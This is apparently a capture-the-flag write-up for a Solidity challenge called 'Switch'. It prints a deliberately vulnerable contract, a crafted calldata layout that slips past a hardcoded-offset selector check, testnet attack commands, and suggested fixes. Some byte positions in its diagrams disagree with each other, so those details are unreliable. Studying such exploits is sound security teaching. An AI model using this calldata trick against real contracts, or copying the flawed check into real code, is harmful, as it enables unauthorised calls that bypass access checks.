# Level 29: Switch Challenge

## Challenge Description

Just have to flip the switch. Can't be that hard, right?

**Things that might help:**
- Understanding how CALLDATA is encoded

## Contract Location

The challenge contract is located at:
```
/contracts/level-29-switch/Switch.sol
```

## Understanding the Challenge

The Switch contract has a simple goal: turn the switch on. However, it has protective modifiers that seem to prevent this.

### The Switch Contract

```solidity
contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        bytes32[1] memory selector;
        assembly {
            calldatacopy(selector, 68, 4)  // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}
```

### Key Components

1. **turnSwitchOn()**: Sets switchOn = true, but has `onlyThis` modifier (only callable by contract itself)
2. **turnSwitchOff()**: Sets switchOn = false, also has `onlyThis` modifier
3. **flipSwitch(bytes _data)**: Can call functions on the contract via `call(_data)`, but has `onlyOff` modifier
4. **onlyOff modifier**: Checks position 68 in calldata for turnSwitchOff() selector

The protection seems foolproof: `flipSwitch` can only call `turnSwitchOff()` based on the `onlyOff` check!

## The Vulnerability

The vulnerability lies in **hardcoded calldata position checking**:

### The Flawed Logic

```solidity
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)  // HARDCODED position!
    }
    require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
    _;
}
```

**The Problem:**
- The modifier checks position 68 for the function selector
- Position 68 is assumed to be where the function selector would be in standard ABI encoding
- But we control the calldata structure!
- We can manipulate the encoding to have different data at position 68 vs. what actually gets called

## Understanding ABI Encoding

To exploit this, we need to understand how function calls with dynamic data are encoded.

### Normal ABI Encoding for flipSwitch(bytes)

When calling `flipSwitch(turnSwitchOff())`, the calldata looks like:

```
Position   | Hex Value                                                          | Description
-----------|--------------------------------------------------------------------|-----------------
0x00-0x03  | 0x30c13ade                                                         | flipSwitch selector
0x04-0x23  | 0x0000000000000000000000000000000000000000000000000000000000000020 | Offset to data = 32
0x24-0x43  | 0x0000000000000000000000000000000000000000000000000000000000000004 | Data length = 4
0x44-0x47  | 0x20606e1500000000000000000000000000000000000000000000000000000000 | turnSwitchOff selector (at position 68!)
```

**Position 68 (0x44)** contains the turnSwitchOff selector - this passes the onlyOff check!

### Why Position 68?

Let's count the bytes:
- Positions 0-3: Function selector (4 bytes)
- Positions 4-35: Offset parameter (32 bytes) = 36 bytes total
- Positions 36-67: Length parameter (32 bytes) = 68 bytes total
- **Position 68+**: The actual data bytes

So position 68 is where the data starts in standard encoding!

### The Exploit: Manipulating the Offset

The key insight: **the offset can be anything we want!**

In standard encoding:
- Offset = 0x20 (32) means data starts at position 36
- The modifier assumes this standard encoding

But we can set:
- Offset = 0x60 (96) to make data start at position 96 instead!

### Malicious Calldata Structure

```
Position   | Hex Value                                                          | Description
-----------|--------------------------------------------------------------------|-----------------
0x00-0x03  | 0x30c13ade                                                         | flipSwitch selector
0x04-0x23  | 0x0000000000000000000000000000000000000000000000000000000000000060 | Offset = 96 (not 32!)
0x24-0x43  | 0x0000000000000000000000000000000000000000000000000000000000000000 | Dummy padding
0x44-0x47  | 0x20606e1500000000000000000000000000000000000000000000000000000000 | turnSwitchOff at pos 68!
0x48-0x63  | 0x0000000000000000000000000000000000000000000000000000000000000000 | More padding
0x64-0x83  | 0x0000000000000000000000000000000000000000000000000000000000000004 | Length = 4
0x84-0x87  | 0x76227e1200000000000000000000000000000000000000000000000000000000 | turnSwitchOn at pos 96!
```

**How it works:**
1. Modifier checks position 68: finds turnSwitchOff ✓ (passes check!)
2. flipSwitch reads _data from offset 0x60 (position 96): finds turnSwitchOn ✓
3. flipSwitch calls turnSwitchOn() - switch turns ON! 💡

## The Attack

### Visual Representation

```
Normal Encoding (offset = 32):
┌──────────┬──────────┬─────────────┬──────────────────┐
│ Selector │ Offset   │ Length      │ Data             │
│ (4B)     │ 32 (32B) │ 4 (32B)     │ turnOff (4B)     │
└──────────┴──────────┴─────────────┴──────────────────┘
0         4          36            68                 72

Malicious Encoding (offset = 96):
┌──────────┬──────────┬─────────┬──────────┬─────────┬─────────────┬─────────────┐
│ Selector │ Offset   │ Padding │ TurnOff  │ Padding │ Length      │ TurnOn      │
│ (4B)     │ 96 (32B) │ (32B)   │ (4B)     │ (28B)   │ 4 (32B)     │ (4B)        │
└──────────┴──────────┴─────────┴──────────┴─────────┴─────────────┴─────────────┘
0         4          36         68         72        96           128           132
                                 ↑                    ↑
                           Modifier checks here  Data actually here
```

### Attack Flow

```
Step 1: Craft Malicious Calldata
├─ Set flipSwitch selector
├─ Set offset to 96 (instead of normal 32)
├─ Put turnSwitchOff at position 68 (for modifier)
└─ Put turnSwitchOn at position 96 (actual data)

Step 2: Send Transaction
├─ onlyOff modifier executes
├─ Checks position 68: finds turnSwitchOff ✓
└─ Modifier passes!

Step 3: flipSwitch Executes
├─ Reads _data from offset 96
├─ Finds turnSwitchOn selector
├─ Calls this.turnSwitchOn()
└─ Switch turns ON! ✓
```

## Key Concepts

### 1. ABI Encoding Deep Dive

**Static Types:**
- Fixed size (uint256, address, etc.)
- Encoded directly in place
- 32 bytes each

**Dynamic Types:**
- Variable size (bytes, string, arrays)
- Encoded in two parts:
  1. Offset to where data starts (32 bytes)
  2. Data at that offset (length + contents)

**Example:**
```solidity
function foo(uint256 a, bytes memory b, uint256 c)
```

Calldata structure:
```
0x00-0x03: Function selector
0x04-0x23: a (uint256)
0x24-0x43: Offset to b (e.g., 0x60)
0x44-0x63: c (uint256)
0x64-0x83: Length of b
0x84-...: Contents of b
```

### 2. Assembly and Calldata Access

**calldatacopy()**:
```solidity
assembly {
    calldatacopy(destMemory, calldataOffset, length)
}
```

- Copies calldata bytes to memory
- `calldataOffset`: Position in calldata to read from
- Direct access - no type safety!

**The Risk:**
- Assumes calldata is structured a certain way
- Hardcoded positions can be manipulated
- Bypasses Solidity's type checking

### 3. Hardcoded Offsets

**Why they're dangerous:**
```solidity
// BAD: Assumes position 68 is the function selector
assembly {
    calldatacopy(selector, 68, 4)
}

// Position 68 depends on the offset!
// Offset 32 → data at 36, selector at 68 ✓
// Offset 96 → data at 96, position 68 has dummy data ✗
```

**The Fix:**
```solidity
// GOOD: Decode properly using Solidity
function flipSwitch(bytes memory _data) public {
    bytes4 dataSelector = bytes4(_data);
    require(dataSelector == offSelector, "Must be turnOff");
    (bool success,) = address(this).call(_data);
    require(success);
}
```

### 4. Function Selectors

Function selectors are the first 4 bytes of keccak256(signature):

```solidity
bytes4 selector = bytes4(keccak256("functionName(uint256,address)"));

// Examples:
flipSwitch(bytes) = 0x30c13ade
turnSwitchOn() = 0x76227e12
turnSwitchOff() = 0x20606e15
```

## Step-by-Step Solution

### Step 1: Deploy the Instance Contract

```bash
npx hardhat deploy --tags level-29 --network sepolia
```

This deploys the Switch contract.

### Step 2: Deploy the Attack Contract (Optional)

```bash
SWITCH_ADDRESS=0xYourSwitchAddress \
  npx hardhat deploy --tags switch-solution --network sepolia
```

Or deploy both together:
```bash
npx hardhat deploy --tags level-29 --network sepolia
```

### Step 3: Execute the Attack

**Method A: Using the attack contract:**
```bash
ATTACK_CONTRACT_ADDRESS=0xYourAttackAddress \
TARGET_ADDRESS=0xSwitchAddress \
  npx hardhat run scripts/level-29-switch/attack.ts --network sepolia
```

**Method B: Direct calldata manipulation:**
```bash
TARGET_ADDRESS=0xSwitchAddress \
  npx hardhat run scripts/level-29-switch/attack.ts --network sepolia
```

Expected result: The switch turns ON!

## Security Lessons

1. **Never Use Hardcoded Calldata Positions**:
   - Calldata structure depends on encoding
   - Offsets can be manipulated
   - What's at position X changes based on how data is encoded

2. **Understand ABI Encoding Thoroughly**:
   - Know how static vs dynamic types are encoded
   - Offsets are relative and can be manipulated
   - Standard encoding is just convention, not enforced

3. **Avoid Assembly for Validation**:
   - Assembly bypasses Solidity's type safety
   - Use Solidity's type system when possible
   - If using assembly, validate ALL aspects of calldata

4. **Validate Data Content, Not Position**:
   ```solidity
   // BAD: Check position
   assembly {
       calldatacopy(selector, 68, 4)
   }
   
   // GOOD: Check actual data
   bytes4 selector = bytes4(_data);
   require(selector == expectedSelector);
   ```

5. **Defense in Depth**:
   - Don't rely on a single check
   - Validate multiple aspects
   - Use established patterns and libraries

## Common Pitfalls

1. **Not Understanding ABI Encoding**: Thinking position 68 is always the data start
2. **Trusting Calldata Structure**: Assuming standard encoding
3. **Hardcoding Positions**: Using magic numbers like 68 without validation
4. **Incomplete Validation**: Only checking one part of the calldata

## Prevention in Real Contracts

### 1. Use Solidity's Type System

```solidity
// BAD: Manual calldata parsing
modifier onlyOff() {
    bytes32[1] memory selector;
    assembly {
        calldatacopy(selector, 68, 4)
    }
    require(selector[0] == offSelector);
    _;
}

// GOOD: Let Solidity handle it
modifier onlyOff(bytes memory _data) {
    require(bytes4(_data) == offSelector, "Wrong function");
    _;
}

function flipSwitch(bytes memory _data) public onlyOff(_data) {
    (bool success,) = address(this).call(_data);
    require(success);
}
```

### 2. Validate Complete Calldata

```solidity
// GOOD: Check the actual data being called
function flipSwitch(bytes memory _data) public {
    // Extract and validate the function selector
    require(_data.length >= 4, "Invalid data");
    bytes4 selector;
    assembly {
        selector := mload(add(_data, 32))
    }
    require(selector == offSelector, "Can only call turnSwitchOff");
    
    // Now safe to call
    (bool success,) = address(this).call(_data);
    require(success, "Call failed");
}
```

### 3. Use Function Modifiers Properly

```solidity
// BEST: Direct function restriction
function flipSwitch(bool turnOn) public {
    if (turnOn) {
        require(canTurnOn(), "Not allowed to turn on");
        _turnSwitchOn();
    } else {
        _turnSwitchOff();
    }
}
```

### 4. Consider Using OpenZeppelin

```solidity
import "@openzeppelin/contracts/access/AccessControl.sol";

contract Switch is AccessControl {
    bytes32 public constant SWITCH_ROLE = keccak256("SWITCH_ROLE");
    bool public switchOn;
    
    function turnSwitchOn() public onlyRole(SWITCH_ROLE) {
        switchOn = true;
    }
    
    function turnSwitchOff() public onlyRole(SWITCH_ROLE) {
        switchOn = false;
    }
}
```

## Advanced Concepts

### Complete ABI Encoding Specification

For a function call `f(uint256 a, bytes memory b, uint256[] memory c)`:

```
Calldata Layout:
0x00-0x03: Function selector (4 bytes)
0x04-0x23: a (32 bytes)
0x24-0x43: offset to b (32 bytes)
0x44-0x63: offset to c (32 bytes)

At offset for b:
0x??-0x??: length of b (32 bytes)
0x??-0x??: contents of b (padded to 32-byte multiples)

At offset for c:
0x??-0x??: length of c (32 bytes)
0x??-0x??: c[0] (32 bytes)
0x??-0x??: c[1] (32 bytes)
...
```

### Why Offsets Exist

Dynamic types can have variable length, so they can't be placed directly in the parameter section. Instead:
1. Parameters section contains offsets
2. Data section (after parameters) contains actual data
3. This allows parsing without knowing lengths beforehand

### Calldata vs Memory vs Storage

- **Calldata**: Read-only, contains transaction input, cheapest to access
- **Memory**: Read-write, temporary, costs gas to expand
- **Storage**: Persistent, most expensive

Assembly operations:
- `calldatacopy`: Copy from calldata
- `mload/mstore`: Memory operations
- `sload/sstore`: Storage operations

## References

- [Solidity ABI Specification](https://docs.soliditylang.org/en/latest/abi-spec.html)
- [Calldata Layout](https://docs.soliditylang.org/en/latest/internals/layout_in_calldata.html)
- [Assembly Opcodes](https://docs.soliditylang.org/en/latest/assembly.html)
- [SWC-127: Arbitrary Jump with Function Type Variable](https://swcregistry.io/docs/SWC-127)

## Deployment

Deploy the challenge contract:
```bash
npx hardhat deploy --tags level-29 --network sepolia
```

Deploy the attack contract:
```bash
SWITCH_ADDRESS=0xAddress \
  npx hardhat deploy --tags switch-solution --network sepolia
```

Execute the attack:
```bash
TARGET_ADDRESS=0xAddress \
  npx hardhat run scripts/level-29-switch/attack.ts --network sepolia
```

## Summary

The Switch level teaches us about:
- ✅ ABI encoding and calldata structure
- ✅ The danger of hardcoded positions in calldata
- ✅ How to manipulate encoding to bypass checks
- ✅ Assembly risks and proper validation
- ✅ Why type systems exist and should be used

The key takeaway: **Never assume calldata structure! What's at a specific position depends entirely on how the data is encoded. Always validate using Solidity's type system, not hardcoded assembly positions!**
